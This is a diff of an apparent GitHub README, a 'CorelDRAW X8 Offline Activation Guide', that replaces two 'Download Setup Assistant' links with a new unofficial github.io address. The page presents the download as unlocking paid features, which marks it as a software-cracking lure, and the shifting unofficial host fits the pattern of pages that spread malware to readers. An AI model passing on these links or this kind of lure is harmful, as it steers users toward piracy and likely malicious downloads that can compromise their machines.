@@ -1,6 +1,6 @@
 # CorelDRAW X8 — Offline Activation Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download%20Setup%20Assistant-28A745?style=for-the-badge&logo=coreldraw&logoColor=white)](https://ryadikmntiiks.github.io/.github/Code)
+[![Download Setup Assistant](https://img.shields.io/badge/Download%20Setup%20Assistant-28A745?style=for-the-badge&logo=coreldraw&logoColor=white)](https://coreldraw-download.github.io/.github)
 
 ---
 
@@ -35,7 +35,7 @@
 ![Corel Export Options](https://th.bing.com/th/id/R.62906daef278a7db14d96ff8e391c89d?rik=%2f%2bvhLavdFh5a1g&pid=ImgRaw&r=0)  
 *Unlocked export and rendering settings*
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download%20Setup%20Assistant-28A745?style=for-the-badge&logo=coreldraw&logoColor=white)](https://ryadikmntiiks.github.io/.github/Code)
+[![Download Setup Assistant](https://img.shields.io/badge/Download%20Setup%20Assistant-28A745?style=for-the-badge&logo=coreldraw&logoColor=white)](https://coreldraw-download.github.io/.github)
 
 ---
 
